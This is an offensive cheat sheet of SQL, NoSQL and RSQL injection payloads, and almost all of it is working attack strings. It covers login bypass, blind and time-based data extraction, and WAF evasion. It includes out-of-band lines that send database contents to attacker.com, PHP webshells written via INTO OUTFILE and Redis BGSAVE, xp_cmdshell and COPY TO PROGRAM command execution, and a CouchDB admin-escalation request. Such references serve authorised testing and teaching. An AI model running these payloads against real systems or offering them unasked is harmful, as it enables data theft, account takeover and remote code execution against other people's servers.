# SQL Injection | NoSQL Injection | RSQL Injection

> A unified reference covering three major injection vulnerability classes — SQL, NoSQL, and RSQL — including detection, payloads, exploitation, and key differences between each type.

---

## Table of Contents

- [Key Differences — SQL vs NoSQL vs RSQL](#key-differences--sql-vs-nosql-vs-rsql)
- [SQL Injection (SQLi)](#-sql-injection-sqli)
  - [Detection](#sqli-detection)
  - [Authentication Bypass](#authentication-bypass)
  - [Union-Based](#union-based-injection)
  - [Error-Based](#error-based-injection)
  - [Blind Boolean-Based](#blind-boolean-based)
  - [Blind Time-Based](#blind-time-based)
  - [Out-of-Band](#out-of-band-sqli)
  - [Stacked Queries](#stacked-queries)
  - [Database-Specific Payloads](#database-specific-payloads)
  - [WAF Bypass](#sqli-waf-bypass)
- [NoSQL Injection (NoSQLi)](#-nosql-injection-nosqli)
  - [Detection](#nosqli-detection)
  - [MongoDB](#mongodb)
  - [CouchDB](#couchdb)
  - [Redis](#redis)
  - [Elasticsearch](#elasticsearch)
  - [WAF Bypass](#nosqli-waf-bypass)
- [RSQL Injection](#-rsql-injection)
  - [Detection](#rsql-detection)
  - [Payloads](#rsql-payloads)
  - [Operators](#rsql-operators)
  - [Exploitation](#rsql-exploitation)
- [References](#references)

---

## Key Differences — SQL vs NoSQL vs RSQL

| Feature | SQL Injection | NoSQL Injection | RSQL Injection |
|---|---|---|---|
| **Target DB** | Relational (MySQL, MSSQL, Oracle, PostgreSQL, SQLite) | Non-relational (MongoDB, Redis, CouchDB, Elasticsearch) | Any DB exposing a REST/RSQL API (Spring, Java backends) |
| **Query Language** | SQL (Structured Query Language) | JSON / BSON / custom DSL | RSQL (RESTful SQl-like query language) |
| **Injection Vector** | SQL query string | JSON body, URL parameters, operators | URL query parameters (`?filter=`, `?search=`) |
| **Syntax Used** | `' OR 1=1--`, `UNION SELECT` | `{"$gt":""}`, `[$ne]=`, `||'a'=='a` | `;name==*`, `=gt=`, `=lt=`, `=in=` |
| **Auth Bypass** | `' OR '1'='1` | `{"$ne": null}` | `name==*;password=gt=0` |
| **Data Extraction** | `UNION SELECT`, error messages | `$where`, `mapReduce`, `$lookup` | Field enumeration via filter operators |
| **Blind Injection** | `SLEEP()`, `SUBSTRING()` | `$regex`, `$where` with timing | Boolean filter manipulation |
| **RCE Potential** | High (xp_cmdshell, INTO OUTFILE) | Medium (MongoDB `$where` JS eval) | Low (filter manipulation only) |
| **Schema Awareness** | Required — must know table/column names | Not required — schema-less | Partial — field names exposed via API |
| **Automated Tools** | SQLMap | NoSQLMap, nosql-injection-fuzzer | Manual / custom scripts |
| **Primary Risk** | Data exfiltration, auth bypass, RCE | Auth bypass, data exfiltration, DoS | Unauthorized data access, filter bypass |

---

## 🗄️ SQL Injection (SQLi)

> User-supplied input is concatenated directly into an SQL query without sanitization. The database interprets the injected input as query logic.

### SQLi Detection

```sql
-- Basic probes
'
''
`)
'))
' OR '1'='1
' OR 1=1--
" OR 1=1--
1' ORDER BY 1--
1' ORDER BY 2--
1' ORDER BY 3--

-- Boolean confirmation
' AND 1=1--     -- True  (normal response)
' AND 1=2--     -- False (different response)

-- Time-based confirmation
' AND SLEEP(5)--
' AND 1=IF(1=1,SLEEP(5),0)--
```

### Authentication Bypass

```sql
' OR '1'='1
' OR 1=1--
' OR 1=1#
admin'--
admin'/*
' OR ''='
') OR ('x'='x
' OR 1=1 LIMIT 1--
'=''OR'
1' OR '1'='1'--
```

### Union-Based Injection

```sql
-- Step 1: Find column count
ORDER BY 1--
ORDER BY 2--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--

-- Step 2: Find printable columns
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--

-- Step 3: Extract data
' UNION SELECT NULL,@@version,NULL--
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT NULL,concat(username,':',password),NULL FROM users--
```

### Error-Based Injection

```sql
-- MySQL
' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--

-- MSSQL
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--

-- PostgreSQL
' AND CAST(version() AS int)--

-- Oracle
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--
```

### Blind Boolean-Based

```sql
-- MySQL
' AND SUBSTRING(database(),1,1)='a'--
' AND ASCII(SUBSTRING(database(),1,1))=109--
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--

-- MSSQL
' AND SUBSTRING((SELECT TOP 1 password FROM users),1,1)='a'--

-- Oracle
' AND SUBSTR((SELECT password FROM users WHERE rownum=1),1,1)='a'--
```

### Blind Time-Based

```sql
-- MySQL
' AND SLEEP(5)--
' AND IF(ASCII(SUBSTRING(database(),1,1))=109,SLEEP(5),0)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--
'; IF (SUBSTRING(db_name(),1,1)='m') WAITFOR DELAY '0:0:5'--

-- PostgreSQL
'; SELECT pg_sleep(5)--
' AND 1=(SELECT 1 FROM pg_sleep(5))--

-- Oracle
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
```

### Out-of-Band SQLi

```sql
-- MySQL DNS
' AND LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.attacker.com\\'))--

-- MSSQL DNS
'; EXEC master..xp_dirtree '\\'+@@version+'.attacker.com\a'--

-- Oracle HTTP
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual--
```

### Stacked Queries

```sql
-- MSSQL OS Command
'; EXEC xp_cmdshell('whoami')--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--

-- MySQL Webshell
'; SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--

-- PostgreSQL
'; COPY (SELECT version()) TO PROGRAM 'curl http://attacker.com/?v='||version()--
```

### Database-Specific Payloads

#### MySQL
```sql
SELECT user(), database(), @@version, @@datadir;
SELECT schema_name FROM information_schema.schemata;
SELECT table_name FROM information_schema.tables WHERE table_schema=database();
SELECT LOAD_FILE('/etc/passwd');
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

#### MSSQL
```sql
SELECT @@version, system_user, db_name();
SELECT name FROM master..sysdatabases;
EXEC xp_cmdshell('whoami');
SELECT * FROM OPENROWSET('SQLNCLI','Server=attacker.com;Trusted_Connection=yes;','SELECT 1');
```

#### Oracle
```sql
SELECT banner FROM v$version;
SELECT table_name FROM all_tables;
SELECT user FROM dual;
SELECT UTL_HTTP.REQUEST('http://attacker.com') FROM dual;
```

#### PostgreSQL
```sql
SELECT version(), current_user, current_database();
SELECT datname FROM pg_database;
COPY (SELECT '') TO PROGRAM 'id > /tmp/out.txt';
SELECT pg_read_file('/etc/passwd', 0, 1000000);
```

#### SQLite
```sql
SELECT sqlite_version();
SELECT name FROM sqlite_master WHERE type='table';
SELECT sql FROM sqlite_master WHERE name='users';
```

### SQLi WAF Bypass

```sql
-- Comment injection
UN/**/ION SEL/**/ECT
/*!UNION*/ /*!SELECT*/

-- Case variation
sElEcT * FrOm UsErS

-- Whitespace alternatives
UNION%09SELECT
UNION%0ASELECT
UNION(SELECT)

-- Encoding
%27 = '    %20 = space    %23 = #
%2527 (double URL encode)

-- Keyword doubling (if WAF strips once)
UNUNIONION SELSELECTECT

-- Scientific notation (MySQL)
1e0UNION SELECT
```

---

## 🍃 NoSQL Injection (NoSQLi)

> NoSQL databases use non-relational query mechanisms. When user input reaches query operators without sanitization, attackers can manipulate query logic using database-native operators (e.g., MongoDB's `$gt`, `$ne`, `$where`).

### NoSQLi Detection

```
# URL parameter probes
?username[$ne]=foo
?username[$gt]=
?username[$regex]=.*
?username[$exists]=true

# JSON body probes
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}

# Operator injection in string fields
username=admin'||'a'=='a
username=admin' && this.password.match(/.*/) || 'a'=='b
```

### MongoDB

#### Authentication Bypass

```json
// JSON body — bypass login
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": "admin", "password": {"$ne": "wrong"}}
{"username": {"$in": ["admin","administrator","root"]}, "password": {"$ne": ""}}
```

```
# URL parameter bypass
?username[$ne]=invalid&password[$ne]=invalid
?username=admin&password[$gt]=
?login[$regex]=.*&password[$regex]=.*
```

#### JavaScript Injection via `$where`

```javascript
// $where executes server-side JS — extremely powerful
{"$where": "this.username == 'admin'"}
{"$where": "sleep(5000)"}                         // Time-based blind
{"$where": "function(){ return true; }"}

// Extract data via timing
{"$where": "if(this.password.match(/^a/)) sleep(5000)"}
{"$where": "if(this.password[0]=='a') sleep(5000)"}
{"$where": "if(this.password.length==8) sleep(5000)"}
```

#### Regex-Based Data Extraction (Blind)

```json
// Test if password starts with 'a'
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ab"}}
{"username": "admin", "password": {"$regex": "^abc"}}

// Extract full password character by character
{"password": {"$regex": "^.{8}$"}}    // Test length = 8
{"password": {"$regex": "^a.{7}$"}}   // First char = a
```

#### MongoDB Aggregation / mapReduce Injection

```javascript
// Via mapReduce (requires authenticated access)
db.collection.mapReduce(
  function() { emit(1, this.password) },
  function(k, v) { return v },
  { out: { inline: 1 } }
)
```

#### PHP-Specific Array Injection

```
# PHP converts [] params to arrays — MongoDB receives operator objects
POST /login
username=admin&password[$ne]=anything
username[$regex]=.*&password[$ne]=x
username[$gt]=&password[$gt]=
```

#### Node.js / Express Injection

```javascript
// Vulnerable code
User.findOne({ username: req.body.username, password: req.body.password })

// Attacker sends JSON
{ "username": "admin", "password": { "$ne": "" } }
```

#### Blind NoSQLi Enumeration

```json
// Enumerate all usernames starting with 'a'
{"username": {"$regex": "^a"}, "password": {"$ne": ""}}

// Enumerate password length
{"username": "admin", "password": {"$regex": "^.{1}$"}}
{"username": "admin", "password": {"$regex": "^.{2}$"}}

// Enumerate collections (via $where)
{"$where": "Object.keys(db.getCollectionNames()).length > 0"}
```

### CouchDB

```
# Authentication bypass via Mango query
POST /_session
{"name": {"$gt": ""}, "password": {"$gt": ""}}

# Direct document access without auth
GET /_all_docs
GET /database/_all_docs

# Admin escalation via _users
PUT /_users/org.couchdb.user:attacker
{
  "name": "attacker",
  "password": "attacker",
  "roles": ["_admin"],
  "type": "user"
}
```

### Redis

```
# Redis injection via command injection in query builders
KEYS *
GET *
CONFIG GET *
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET payload "<?php system($_GET['cmd']); ?>"
BGSAVE

# SSRF to Redis (via Gopher protocol)
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A

# Unauthorized access
redis-cli -h target.com
redis-cli -h target.com CONFIG GET requirepass
redis-cli -h target.com KEYS '*'
```

### Elasticsearch

```json
// Unrestricted query via JSON body
POST /index/_search
{"query": {"match_all": {}}}

// Wildcard injection
{"query": {"wildcard": {"username": "*"}}}

// Script injection (Groovy/Painless — old versions)
{"query": {"script": {"script": "Runtime.getRuntime().exec('id')"}}}

// Field enumeration
{"query": {"exists": {"field": "password"}}}

// Regex extraction
{"query": {"regexp": {"username": "adm.*"}}}
```

### NoSQLi WAF Bypass

```
# Alternate operator encoding
username%5B$ne%5D=x          → username[$ne]=x
username%5B%24ne%5D=x        → username[$ne]=x (double encode)

# JSON Content-Type swap
Content-Type: application/json
{"username": {"$ne": null}}

# Parameter pollution
?username=admin&username[$ne]=x

# Unicode bypass
{"username": {"$\u006ee": null}}    → {"username": {"$ne": null}}
```

---

## 🔍 RSQL Injection

> RSQL (RESTful SQl-like Query Language) is a query language used in Java/Spring REST APIs to filter resources via URL parameters. Injection occurs when user-supplied RSQL expressions are parsed and passed to backend queries without validation.

### What is RSQL?

RSQL is commonly used with:
- Spring Data JPA (`rsql-jpa-specification`)
- Crnk framework
- Apache Olingo
- Custom REST filter implementations

Typical vulnerable endpoint:

```
GET /api/users?filter=name==John
GET /api/products?search=price=lt=100
GET /api/orders?q=status==active;userId==123
```

### RSQL Detection

```
# Basic operator probes — look for different responses or errors
?filter=name==*
?filter=name!=null
?filter=id=gt=0
?filter=id=lt=9999999
?filter=name=in=(admin,root,user)
?filter=name=out=(guest)

# Boolean manipulation
?filter=id==1;name==*          # AND — both conditions true
?filter=id==1,name==fake       # OR  — either condition true

# Error-triggering probes
?filter=name=='
?filter=name==;
?filter===
?filter=id=gt=abc              # Type mismatch → error leaks field type
```

### RSQL Operators

| Operator | Meaning | Example |
|---|---|---|
| `==` | Equal | `name==John` |
| `!=` | Not equal | `status!=inactive` |
| `=gt=` or `>` | Greater than | `age=gt=18` |
| `=ge=` or `>=` | Greater than or equal | `price=ge=100` |
| `=lt=` or `<` | Less than | `price=lt=500` |
| `=le=` or `<=` | Less than or equal | `stock=le=10` |
| `=in=` | In list | `role=in=(admin,mod)` |
| `=out=` | Not in list | `role=out=(guest,user)` |
| `;` | AND | `name==John;age=gt=18` |
| `,` | OR | `role==admin,role==mod` |
| `==*` | Wildcard (LIKE %) | `name==Jo*` |
| `=regex=` | Regex match | `email=regex=.*@corp\.com` |

### RSQL Payloads

#### Unauthorized Data Access

```
# Dump all records by wildcard match
GET /api/users?filter=name==*
GET /api/users?filter=id=gt=0
GET /api/users?filter=status!=DELETED_NONEXISTENT_VALUE

# Access other users' data
GET /api/orders?filter=userId=gt=0          # All orders from all users
GET /api/documents?filter=owner==*          # All documents
```

#### Authentication / Authorization Bypass

```
# Bypass user-scoped filter
GET /api/profile?filter=id=gt=0;role==admin
GET /api/users?filter=role==admin
GET /api/users?filter=role=in=(admin,superuser,root)

# Enumerate admin accounts
GET /api/users?filter=role==admin;name==*
GET /api/users?filter=email=regex=.*@company\.com;role==admin
```

#### Blind Field Enumeration

```
# Test if a field exists and has a value
GET /api/users?filter=password=gt=0        # Error = field exists / type mismatch info
GET /api/users?filter=ssn==*               # Response reveals if field exists
GET /api/users?filter=internalNote!=null   # Reveals hidden fields

# Extract data by character range (if wildcard supported)
GET /api/users?filter=password==a*
GET /api/users?filter=password==ab*
GET /api/users?filter=password==abc*
```

#### OR Condition Abuse

```
# Force true condition
GET /api/users?filter=id==1,id=gt=0        # OR — always true
GET /api/users?filter=name==FAKE,name==*   # OR — always true via wildcard

# Bypass role check
GET /api/data?filter=ownerId==999,role==admin
```

#### RSQL to SQL Injection (Backend Passthrough)

> If the RSQL parser passes values unsanitized to the underlying SQL query:

```
# Attempt SQL metacharacter injection through RSQL value
GET /api/users?filter=name==' OR '1'='1
GET /api/users?filter=name==John' OR '1'='1'--
GET /api/users?filter=id=gt=0 UNION SELECT null,username,password FROM users--

# Time-based if backend is SQL
GET /api/users?filter=name==John';WAITFOR DELAY '0:0:5'--
GET /api/users?filter=name==John' AND SLEEP(5)--
```

#### Spring/JPA Specific

```
# Target common Spring Data field names
?filter=createdBy==*
?filter=lastModifiedBy==*
?filter=deletedAt==null
?filter=active==true;role==ADMIN

# Expose internal/audit fields
?filter=version=gt=0
?filter=revision=gt=0
```

### RSQL Exploitation

#### Step-by-Step: Unauthorized Data Dump

```
1. Identify RSQL endpoint:
   GET /api/users?filter=name==test → 200 OK with filtered results

2. Confirm wildcard works:
   GET /api/users?filter=name==* → returns all users

3. Enumerate fields:
   GET /api/users?filter=role==* → may return role values
   GET /api/users?filter=password!=null → confirms field exists

4. Extract sensitive data:
   GET /api/users?filter=role=in=(ADMIN,SUPERADMIN)
   GET /api/users?filter=email=regex=.*

5. Access cross-tenant data:
   GET /api/orders?filter=customerId=gt=0 → all orders regardless of tenant
```

---

## Quick Comparison — Attack Scenarios

| Scenario | SQL Injection | NoSQL Injection | RSQL Injection |
|---|---|---|---|
| **Bypass login** | `' OR 1=1--` | `{"$ne": null}` | `name==*;password=gt=0` |
| **Dump all records** | `UNION SELECT * FROM users--` | `{"$regex": ".*"}` | `?filter=id=gt=0` |
| **Extract specific field** | `UNION SELECT password FROM users--` | `{"$regex": "^a"}` (blind) | `?filter=password==a*` |
| **Check if field exists** | Error-based / schema query | `{"field": {"$exists": true}}` | `?filter=fieldname!=null` |
| **Time-based blind** | `SLEEP(5)` / `WAITFOR DELAY` | `$where: sleep(5000)` | Inject SQL via passthrough |
| **RCE** | `xp_cmdshell`, `INTO OUTFILE` | `$where` JS eval, Redis BGSAVE | Not directly possible |
| **Enumerate users** | `information_schema.tables` | `$regex` on username field | `?filter=role=in=(admin,user)` |
| **WAF Bypass** | Comments, encoding, case | Unicode `$\u006ee`, JSON swap | URL encode operators |

---

## References

- OWASP SQL Injection Prevention Cheat Sheet
- OWASP NoSQL Injection Cheat Sheet
- PortSwigger Web Security Academy — SQL Injection
- PortSwigger Web Security Academy — NoSQL Injection
- Spring Data JPA + RSQL Specification
